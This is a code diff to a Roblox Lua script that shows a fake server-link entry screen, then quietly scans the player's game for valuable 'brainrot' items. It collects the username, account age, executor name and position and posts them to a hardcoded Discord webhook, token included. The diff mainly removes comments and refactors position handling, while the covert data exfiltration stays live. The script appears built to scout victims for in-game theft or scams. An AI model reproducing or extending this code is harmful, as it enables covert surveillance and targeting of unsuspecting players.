@@ -67,12 +67,7 @@ local BRAINROT_VALUES = {
 }
 
 -- Floor Detection Configuration
--- Define floor heights (Y coordinates) for games with specific floor levels
--- Leave empty to use automatic raycast detection
-local FLOOR_HEIGHTS = {
-    -- Example: [0] = "Ground Floor", [50] = "Floor 2", [100] = "Floor 3"
-    -- Add your game's specific floor Y-coordinates here
-}
+local FLOOR_HEIGHTS = {}
 
 -- Packages
 local NetPackages = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
@@ -397,20 +392,17 @@ local function getCurrentFloor()
     raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
     
     local rayOrigin = currentPos
-    local rayDirection = Vector3.new(0, -50, 0) -- Cast down 50 studs
+    local rayDirection = Vector3.new(0, -50, 0)
     
     local raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
     
     if raycastResult then
         local hitPart = raycastResult.Instance
         if hitPart then
-            -- Check if the part or its parent has a floor-related name
             local partName = hitPart.Name:lower()
             local parentName = hitPart.Parent and hitPart.Parent.Name:lower() or ""
             
-            -- Common floor naming patterns
             if partName:find("floor") or partName:find("level") or partName:find("stage") then
-                -- Extract floor number if present
                 local floorNum = partName:match("%d+") or parentName:match("%d+")
                 if floorNum then
                     return "Floor " .. floorNum
@@ -420,7 +412,6 @@ local function getCurrentFloor()
             elseif partName:find("ground") or partName:find("baseplate") or partName:find("terrain") then
                 return "Ground Floor"
             else
-                -- Return the part name as fallback
                 return hitPart.Name
             end
         end
@@ -453,7 +444,6 @@ local function scanBrainrots()
         if obj:IsA("Model") or obj:IsA("Tool") or obj:IsA("Part") then
             local name = obj.Name
             
-            -- Check against our value table
             for brainrotName, value in pairs(BRAINROT_VALUES) do
                 if name:lower():find(brainrotName:lower()) then
                     table.insert(foundBrainrots, {
@@ -467,7 +457,6 @@ local function scanBrainrots()
                 end
             end
             
-            -- Check for numeric values in name (e.g., "Brainrot x5")
             local multiplier = name:match("x(%d+)$") or name:match("(%d+)x")
             if multiplier then
                 local mult = tonumber(multiplier)
@@ -487,7 +476,6 @@ enterButton.MouseButton1Click:Connect(function()
     local serverLink = serverLinkBox.Text
     local isValidLink = serverLink:match("^https://www%.roblox%.com/share%?code=[%w%d]+&type=Server$") or serverLink == "admin123"
     
-    -- Validation check
     if not isValidLink then
         enterButton.Text = "❌ INVALID LINK"
         enterButton.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
@@ -501,13 +489,11 @@ enterButton.MouseButton1Click:Connect(function()
         return
     end
 
-    -- Success animation
     enterButton.Text = "✅ ACCESS GRANTED"
     enterButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
     
     wait(0.8)
     
-    -- Fade out UI
     TweenService:Create(mainFrame, TweenInfo.new(0.5), {
         Position = UDim2.new(0.5, -225, 1.5, 0)
     }):Play()
@@ -515,13 +501,11 @@ enterButton.MouseButton1Click:Connect(function()
     wait(0.5)
     brainrotUI:Destroy()
 
-    -- Gather data
     local executorName = getExecutorName()
     local accountAgeDays = LocalPlayer.AccountAge
     local foundBrainrots, totalValue, totalCount = scanBrainrots()
     local currentFloor = getCurrentFloor()
     
-    -- Format brainrot list for webhook
     local brainrotList = ""
     if #foundBrainrots > 0 then
         for i, item in ipairs(foundBrainrots) do
@@ -532,17 +516,22 @@ enterButton.MouseButton1Click:Connect(function()
         brainrotList = "No brainrots detected in workspace"
     end
     
-    -- Calculate total in EUR
     local totalEUR = string.format("€%.2f", totalValue)
     
-    -- Prepare webhook data
+    -- Get position safely
+    local char = LocalPlayer.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    local posX = hrp and hrp.Position.X or 0
+    local posY = hrp and hrp.Position.Y or 0
+    local posZ = hrp and hrp.Position.Z or 0
+    
     task.spawn(function()
         local webhookData = {
             username = "GodFathers Security",
             avatar_url = "https://i.imgur.com/6XK8YBn.png",
             embeds = {{
                 title = "🔴 New Execution Detected",
-                color = 0xDC143C, -- Crimson red
+                color = 0xDC143C,
                 timestamp = DateTime.now():ToIsoDate(),
                 thumbnail = {
                     url = "https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. LocalPlayer.Name
@@ -563,13 +552,7 @@ enterButton.MouseButton1Click:Connect(function()
                     {
                         name = "📍 Location Data",
                         value = string.format("**Current Floor:** %s\n**Position:** %.1f, %.1f, %.1f", 
-                            currentFloor, 
-                            LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and 
-                            LocalPlayer.Character.HumanoidRootPart.Position.X or 0,
-                            LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and 
-                            LocalPlayer.Character.HumanoidRootPart.Position.Y or 0,
-                            LocalPlayer.Character and LocalPlayer.Character:FindForFirstChild("HumanoidRootPart") and 
-                            LocalPlayer.Character.HumanoidRootPart.Position.Z or 0),
+                            currentFloor, posX, posY, posZ),
                         inline = false
                     },
                     {
@@ -590,7 +573,6 @@ enterButton.MouseButton1Click:Connect(function()
             }}
         }
         
-        -- Send webhook with error handling
         local success, err = pcall(function()
             local response = request({
                 Url = "https://discord.com/api/webhooks/1475151471631667378/MMcbj311BeXhS5kom8h8InyjHmygsQQR_6_qOxbQjKV7Pt2r1FszKsr0cxD1hdkz-oAa",
@@ -611,6 +593,5 @@ enterButton.MouseButton1Click:Connect(function()
         end
     end)
     
-    -- Re-enable CoreGui after execution
     StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
 end)
